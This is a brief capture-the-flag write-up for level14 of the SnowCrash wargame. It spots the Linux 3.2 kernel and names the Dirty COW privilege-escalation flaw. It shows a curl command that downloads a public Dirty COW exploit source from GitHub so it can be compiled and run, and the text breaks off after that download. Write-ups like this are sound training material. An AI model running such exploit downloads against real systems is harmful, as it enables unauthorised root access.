# level14

## Recognition

When logging on level14, there is nothing really appealing, though we can look at the linux kernel version.
```bash
level14@SnowCrash:~$ uname -a
Linux SnowCrash 3.2.0-89-generic-pae #127-Ubuntu SMP Tue Jul 28 09:52:21 UTC 2015 i686 i686 i386 GNU/Linux
```

As we can see [here](https://www.avsecurity.in/dirty-cow-vulnerability-cve-2016-5195/) there is a vulnerability in Linux 3.2 named dirtyc0w that we can exploit.

</br>
</br>

## Exploitation

The exploit part is quite easy for this one, we just have to download a compatible exploit of dirtyc0w, compile it and running. 
```bash
level14@SnowCrash:~$ chmod +rwx .
level14@SnowCrash:~$ curl -fSSL https://raw.githubusercontent.com/firefart/dirtycow/master/dirty.c > dirty.c
level14@SnowCrash:~$ 
```